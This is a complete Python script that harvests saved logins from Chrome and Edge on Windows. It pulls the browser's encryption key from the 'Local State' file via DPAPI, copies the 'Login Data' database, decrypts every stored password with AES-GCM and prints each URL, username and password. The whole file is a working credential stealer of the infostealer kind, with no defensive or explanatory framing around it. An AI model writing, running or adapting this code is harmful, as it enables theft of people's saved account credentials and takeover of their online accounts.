import os
import json
import base64
import sqlite3
import shutil
import time
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import win32crypt

def convert_date(chromedate):
    base_date = datetime(1601, 1, 1)
    return base_date + timedelta(microseconds=chromedate)

def get_encryption_key(browser="Chrome"):
    try:
        local_state_path = os.path.join(
            os.environ["USERPROFILE"], 
            "AppData", "Local", 
            "Google" if browser == "Chrome" else "Microsoft", 
            "Chrome" if browser == "Chrome" else "Edge", 
            "User Data", "Local State"
        )
        with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.loads(file.read())
        
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        raise RuntimeError(f"Failed to retrieve encryption key for {browser}: {e}")

def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        encrypted_payload = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_payload)[:-16].decode()
    except Exception:
        return "Unable to decrypt password"

def fetch_passwords(browser="Chrome"):
    """
    Retrieves stored passwords from Chrome or Edge.
    """
    try:
        key = get_encryption_key(browser)
        db_path = os.path.join(
            os.environ["USERPROFILE"], 
            "AppData", "Local", 
            "Google" if browser == "Chrome" else "Microsoft", 
            "Chrome" if browser == "Chrome" else "Edge", 
            "User Data", "Default", "Login Data"
        )
        temp_db_path = f"{browser}_LoginVault.db"
        shutil.copy2(db_path, temp_db_path)

        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        
        passwords = {}
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            decrypted_password = decrypt_password(encrypted_password, key)
            if username or decrypted_password:
                passwords[url] = {"username": username, "password": decrypted_password}

        cursor.close()
        conn.close()
        os.remove(temp_db_path)
        return passwords
    except Exception as e:
        raise RuntimeError(f"Failed to retrieve passwords for {browser}: {e}")

def grab_passwords():
    try:
        chrome_passwords = fetch_passwords("Chrome")
    except RuntimeError as e:
        print(e)
        chrome_passwords = {}

    try:
        edge_passwords = fetch_passwords("Edge")
    except RuntimeError as e:
        print(e)
        edge_passwords = {}

    all_passwords = {**chrome_passwords, **edge_passwords}
    return all_passwords

if __name__ == "__main__":
    passwords = grab_passwords()
    for url, creds in passwords.items():
        print(f"URL: {url}\nUsername: {creds['username']}\nPassword: {creds['password']}\n")
